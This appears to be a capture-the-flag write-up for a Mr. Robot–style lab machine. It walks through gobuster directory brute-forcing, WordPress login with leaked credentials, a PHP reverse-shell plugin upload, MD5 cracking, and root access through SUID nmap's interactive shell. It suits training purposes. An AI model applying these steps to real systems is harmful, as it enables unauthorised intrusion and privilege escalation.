```bash
export IP=10.10.168.27
```

# Gobuster

```bash
gobuster dir -u http://$IP -w /opt/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py | tee gobuster
```

Found file /license

There was credentials: ```elliot:ER28-0652```. Use it to /login

# WordPress

Users > Krista Gordon > Generate Password

Bio: `another key?`

# Reverse Shell

Create new plugin and use php reverse shell (reverse.php)

To get normal shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
cat /home/robot/password.raw-md5
```

After simple crack md5: 
robot:abcdefghijklmnopqrstuvwxyz

```bash
su -l robot
```

Then just read the key

# Root

To find what I can do
```bash
find / -perm +6000 2>/dev/null | grep '/bin/'
```
nmap!

```bash
nmap --interactive
!sh
cat /root/key-3-of-3.txt
```
